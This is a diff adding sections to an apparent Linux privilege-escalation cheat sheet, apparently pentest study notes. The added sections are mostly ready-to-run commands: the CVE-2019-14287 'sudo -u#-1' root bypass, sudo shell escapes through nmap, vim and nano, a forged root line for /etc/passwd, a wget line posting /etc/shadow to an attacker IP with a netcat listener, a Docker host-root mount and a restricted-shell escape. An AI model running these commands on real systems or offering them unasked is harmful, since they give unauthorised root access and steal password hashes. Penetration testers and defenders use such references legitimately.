@@ -182,6 +182,44 @@ void _init() {
 
 Execute any binary with the LD\_PRELOAD to spawn a shell : `sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`
 
+#### CVE-2019-14287
+
+{% embed url="https://www.exploit-db.com/exploits/47502" %}
+
+Joe Vennix found that if you specify a UID of -1 (or its unsigned equivalent: 4294967295), Sudo would incorrectly read this as being 0 (i.e. root). This means that by specifying a UID of -1 or 4294967295, you can execute a command as root, _despite being explicitly prevented from doing so_. It is worth noting that this will _only_ work if you've been granted non-root sudo permissions for the command
+
+```bash
+# Exploitable when a user have the following permissions (sudo -l)
+(ALL, !root) ALL
+
+# If you have a full TTY, you can exploit it like this
+sudo -u#-1 /bin/bash
+sudo -u#4294967295 id
+```
+
+## Sudo Shell Escaping
+
+#### nmap
+
+```bash
+sudo nmap --interactive
+nmap> !sh
+```
+
+#### vim
+
+```bash
+sudo vim -c ':!/bin/sh'
+```
+
+#### nano
+
+```bash
+sudo nano
+^R^X
+reset; sh 1>&0 2>&0
+```
+
 ## SUID
 
 SUID/Setuid stands for "set user ID upon execution", it is enabled by default in every Linux distributions. If a file with this bit is run, the uid will be changed by the owner one. If the file owner is `root`, the uid will be changed to `root` even if it was executed from user `bob`. SUID bit is represented by an `s`.
@@ -198,6 +236,35 @@ SUID/Setuid stands for "set user ID upon execution", it is enabled by default in
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 find / -uid 0 -perm -4000 -type f 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
+```
+
+#### wget
+
+{% embed url="https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/" %}
+
+This article explains perfectly how we can take advantage of this by adding a user to our /etc/passwd file and uploading it to the victim machine via wget, thus replacing its existing file
+
+```bash
+openssl passwd -1 -salt ignite pass123
+$1$ignite$3eTbJm98O9Hz.k1NTdNxe1
+ignite:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/usr/bin/bash
+```
+
+You can also abuse this by using wget to transfer a file to your local machine
+
+```bash
+# on victim machine
+sudo wget --post-file=/etc/shadow http://[ATTACKER IP]:8081
+# on kali
+nc -lnvp 8081
+```
+
+#### apache2
+
+You can get a shell or edit system files, but you can _**view** _ them
+
+```
+sudo apache2 -f /etc/shadow
 ```
 
 ## Create a SUID binary
@@ -316,6 +383,29 @@ whoami
 #### Resources
 
 {% embed url="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/" %}
+
+## Docker
+
+{% embed url="https://flast101.github.io/docker-privesc/" %}
+
+{% embed url="https://gtfobins.github.io/gtfobins/docker/" %}
+
+```bash
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+## Restricted Shell
+
+{% embed url="https://0xffsec.com/handbook/shells/restricted-shells/" %}
+
+Example:
+
+```bash
+vim
+:set shell=/bin/bash
+:shell
+export PATH=/bin:/usr/bin or export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11:/usr/games
+```
 
 ## Kernel Exploits
 
